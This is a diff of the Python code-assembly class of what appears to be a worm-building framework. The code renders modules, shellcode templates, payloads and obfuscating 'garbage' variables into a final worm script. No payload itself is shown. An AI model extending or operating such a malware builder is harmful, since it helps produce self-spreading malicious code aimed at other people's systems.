@@ -9,65 +9,7 @@ from .tools.shadow import Shadow
 from .tools.garbage_man_var import GarbageMan
 from .tools.pay_builder import PayloadBuilder
 
-from .tools.pay_builder2 import PayloadBuilder2
-
 from .tools.coder_template_tools.master_tool import MasterTempTool
-
-
-class RawCode:
-    def __init__(self, coder: object, lang: str):
-        self.coder = coder
-        self.msg = self.coder.msg
-        # language type
-        self.lang = lang
-        
-        self._code = ""
-        self._py_imports = set()
-    
-    @property
-    def code(self) -> str:
-        return self._code
-    
-    @property
-    def imports(self) -> list:
-        match self.lang:
-            case "py":
-                return list(self._py_imports)
-            case _:
-                return []
-        
-    def add_code(self, code: str) -> None:
-        match self.lang:
-            case "py":
-                fcode, imp = self.separate_py_code(code)
-                self.add_imports(imp)
-                self._code += code
-            case _:
-                self._code += code
-        
-        
-    
-    def add_imports(self, imports: Union[list, tuple, set], types: str = "py") -> None:
-        match types:
-            case "py":
-                imp = self._py_imports
-            case _:
-                return
-        for i in imports:
-            imp.add(i)
-    
-    def separate_py_code(self, code: str) -> tuple:
-        fcode = ""
-        imp = []
-        for line in code.split("\n"):
-            if line.startswith("import") or line.startswith("from"):
-                imp.append(line)
-            else:
-                fcode += line + "\n"
-        return (fcode, imp)
-
-
-
 
 
 class Coder:
@@ -94,6 +36,8 @@ class Coder:
     def globalVar(self) -> dict:
         gv = self.global_var.copy()
         gv.update(self.WB.globalVar)
+        # ######
+        # gv.update(self.WB.raw_worm.process.options)
         return gv
     
     @property
@@ -123,15 +67,17 @@ class Coder:
             var[name] = food.value
         for name, gar_v in self.WB.raw_worm.garbageVar.items():
             var[name] = self.garbage_man.generate(gar_v)
-        pb2 = PayloadBuilder2(self.queen, self)
         for name, pay in self.WB.raw_worm.payloads.items():
-            ## test new system
-            if pay.payload_new:
-                var[name] = pb2.process(pay, name, self.get_owner(pay.owner), var)
-            else:
-                pb = PayloadBuilder(self.queen, self)
-                payload = pb.process(pay, name, var, self.get_owner(pay.owner).payStep)
-                var[name] = payload
+            # if "@" in pay.tags:
+            #### test
+            pb = PayloadBuilder(self.queen, self)
+            payload = pb.process(pay, name, var, self.get_owner(pay.owner).payStep)
+            var[name] = payload
+            ####################
+            ##### OLD FUNCTION
+            # else:
+            #     opt = pay.options
+            #     var[name] = self.payloader.prepare(pay, var, name, opt)
         for name in self.WB.raw_worm.reqPayload.keys():
             if self.WB.raw_worm.master_worm.lang == "asm":
                 var[name] = ""
@@ -191,7 +137,15 @@ class Coder:
         return code
     
 
-
+    # def format_code(self, code: str, coder_opt: dict) -> str:
+    #     format_code = coder_opt.get("FORMAT")
+    #     if format_code:
+    #         match format_code:
+    #             case "PS_SCRIPT":
+    #                 code = self.tools.powershell_script(code)
+    #             case _:
+    #                 self.msg("error", f"ERROR: Unknown 'code format' : '{format_code}'")
+    #     return code
 
 
     def render_single(self, mod: Union[str, object], var: dict = None) -> str:
@@ -203,7 +157,9 @@ class Coder:
         code = self.return_code(mod, mod.import_FLAG)
         if mod.render_FLAG:
             code = Template(code)
-            code = code.render(**var, TOOL=self.temp_tools)
+            code = code.render(var)
+        # if len(mod.coderOpt) > 0:
+        #     code = self.format_code(code, mod.coderOpt)
         return code
 
     # New render
@@ -269,62 +225,18 @@ class Coder:
         with open(self.raw_worm_file_path, "w") as file:
             file.write(code)
         self.msg("msg", f"Save raw worm: '{name}{file_ext}' successful.")
-    
-
-    
 
         
     def code_worm_base(self, var: dict = None, options: dict = {}) -> str:
         if not var:
             var = self.var
         imp_FLAG = options.get("INCLUDE_IMPORTS")
-        code = RawCode(self, self.WB.lang)
-        # this modules is not append to final code
-        no_accept = ["dll", "lib", "mod_loader"]
-        for mod in self.WB.raw_worm.modules.values():
-            if mod.subTypes in no_accept:
-                continue
-            mod_code = self.render_single(mod, var)
-            code.add_code(mod_code)
-        for smod in self.WB.raw_worm.support.values():
-            if smod.subTypes in no_accept:
-                continue
-            mod_code = self.render_single(mod, var)
-            code.add_code(mod_code)
-        # shellcode template
-        scode = self.WB.raw_worm.scode
-        if scode:
-            mod_code = self.render_single(scode, var)
-            code.add_code(mod_code)
-        # add master worm code
-        master_code = self.render_single(self.WB.raw_worm.master_worm, var)
-        code.add_code(master_code)
-
-        
         if imp_FLAG:
-            worm_code = "\n".join(self.imports)
+            code = "\n".join(self.imports) + self.raw_code(var)
         else:
-            worm_code = ""
-        
-        worm_code += "\n".join(code.imports) + "\n" + code.code
-        wcode = Template(worm_code)
-        wcode = wcode.render(**var, TOOL=self.temp_tools)
-        wcode = self.clear_garbage_imports(wcode)
-
-        return wcode
-        
-
-    def clear_garbage_imports(self, code: str) -> str:
-        imp = set()
-        rcode = ""
-        for line in code.split("\n"):
-            if line.startswith("import") or line.startswith("from"):
-                imp.add(line)
-            else:
-                rcode += "\n" + line
-        code = "\n".join(imp) + "\n" + rcode
-        return code
-
-
+            code = self.raw_code(var)
+        rcode = Template(code)
+        rcode = rcode.render(**var, TOOL=self.temp_tools)
+        return rcode
         
 
